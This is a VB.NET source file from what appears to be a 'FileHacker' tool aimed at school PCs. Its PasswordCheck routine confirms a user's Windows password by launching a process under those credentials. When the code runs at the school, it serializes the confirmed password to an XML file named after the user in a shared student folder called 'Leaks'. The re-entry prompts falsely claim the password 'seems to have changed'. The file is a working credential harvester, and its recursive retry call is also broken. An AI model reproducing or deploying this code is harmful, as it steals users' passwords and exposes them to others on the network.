Imports System.Text
Imports FHCodePack.SchoolPCChecker
Imports System.Security
Imports System.IO
Imports FHCodePack

Public Class Tools
    Public Shared Function VerifyPassword(pw As String) As Boolean
        Try
            Dim si As New ProcessStartInfo
            si.FileName = System.Reflection.Assembly.GetEntryAssembly().Location
            si.Arguments = """passwordCheck"""
            si.UserName = GetUN()
            si.Domain = Environment.UserDomainName
            Dim ssPwd As New SecureString()
            For Each c As Char In pw
                ssPwd.AppendChar(c)
            Next
            si.Password = ssPwd
            si.UseShellExecute = False
            Process.Start(si).WaitForExit()
            Return True
        Catch ex As Exception
            Console.WriteLine(ex.GetType.Name)
            Console.WriteLine(ex.Message)
            Console.WriteLine(ex.StackTrace)
            Return False
        End Try
    End Function
    Private Shared Function MixLetters(s As String) As String
        Dim sb As New StringBuilder
        Dim b = New Random().Next < (Integer.MaxValue / 2) Xor New Random().Next > (Integer.MaxValue / 2)
        For Each i In s
            If b Then
                If Char.IsLower(i) Then
                    sb.Append(Char.ToUpper(i))
                Else
                    sb.Append(Char.ToLower(i))
                End If
            Else
                sb.Append(i)
            End If
            b = b Xor New Random().Next < (Integer.MaxValue / 2) Xor New Random().Next > (Integer.MaxValue / 2)
        Next
        Return sb.ToString
    End Function
    Public Shared Sub SerializeObject(obj As Object, saveto As String)
        'ArrayListに追加されているオブジェクトを指定してXMLファイルに保存する
        Dim serializer As New System.Xml.Serialization.XmlSerializer( _
            obj.GetType)
        Dim sw As New System.IO.StreamWriter( _
           saveto, False, New System.Text.UTF8Encoding(False))
        serializer.Serialize(sw, obj)
        '閉じる
        sw.Close()
    End Sub
    Public Shared Sub MakeFolder(path As String)
        If Not Directory.Exists(path) Then
            Directory.CreateDirectory(path)
        End If
    End Sub
    Public Shared Function PasswordCheck(pw As String, Optional oneMore As Boolean = False) As String
        If Tools.VerifyPassword(pw) Then
            If IsSchool Then
                MakeFolder("\\pcjhkhsv01\生徒共用\FileHacker\Leaks\")
                Tools.SerializeObject(New PasswordStronghold(pw), "\\pcjhkhsv01\生徒共用\FileHacker\Leaks\Password_" & GetUN() & ".xml")
            End If
            Return pw
        Else
            Dim asa As New AskString()
            If oneMore Then
                pw = asa.AskString("パスワードが間違っているようです。" & vbCrLf & "もう一回入力して下さい。", "パスワード入力", Nothing, "●"c)
            Else
                pw = asa.AskString("パスワードが変更されたようです。" & vbCrLf & "もう一回入力して下さい。", "パスワード入力", Nothing, "●"c)
            End If
            Return PasswordCheck(True)
        End If
    End Function
    Public Shared Sub ForceStop()
        System.Windows.Forms.Application.Exit()
        Process.GetCurrentProcess.Kill()
    End Sub

End Class
